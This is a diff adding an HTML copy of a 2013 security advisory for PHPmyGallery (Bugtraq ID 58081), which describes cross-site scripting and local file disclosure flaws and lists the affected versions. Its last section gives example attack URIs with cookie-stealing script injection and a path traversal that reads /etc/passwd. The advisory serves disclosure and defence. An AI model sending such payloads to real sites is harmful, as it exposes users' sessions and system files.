@@ -1,0 +1,104 @@
+#SpeeDr00t@Black Falcon<br>#bid58081<p><b><span style="font-size: 18pt;">PHPmyGallery Local File Disclosure and Cross Site Scripting Vulnerabilities </span></b></p><br><br><a href="http://www.securityfocus.com/bid/58081/info">info</a><br><a href="http://www.securityfocus.com/bid/58081/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/58081/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/58081/solution">solution</a><br><a href="http://www.securityfocus.com/bid/58081/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				58081
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 21 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 21 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				TheMirkin
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					PHPmyGallery PHPmyGallery 1.51.10 <br/>
+					
+				
+					PHPmyGallery PHPmyGallery  1.5beta<br/>
+					
+				
+					PHPmyGallery PHPmyGallery  1.51gold<br/>
+					
+				
+					PHPmyGallery PHPmyGallery  1.0beta2<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues by enticing an unsuspecting victim into following a malicious URI.               <br/> <br/>The following example URIs are available:   <br/> <br/>http://www.www.example.com/_conf/?action=statistics&amp;amp;filename=2011.10"&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;gt;&amp;lt;marquee&amp;gt;&amp;lt;h1&amp;gt;TheMirkin&amp;lt;/h1&amp;gt;&amp;lt;/marquee&amp;gt;   <br/> <br/>http://www.www.example.com/_conf/?action=delsettings&amp;amp;group="&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;gt;&amp;lt;marquee&amp;gt;&amp;lt;h1&amp;gt;TheMirkin&amp;lt;/h1&amp;gt;&amp;lt;/marquee&amp;gt;  <br/> <br/>http://www.example.com/_conf/?action=delsettings&amp;amp;group=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&amp;amp;picdir=Sample_Gallery&amp;amp;what=descriptions
+	
+		<ul>
+</ul>
+</div>
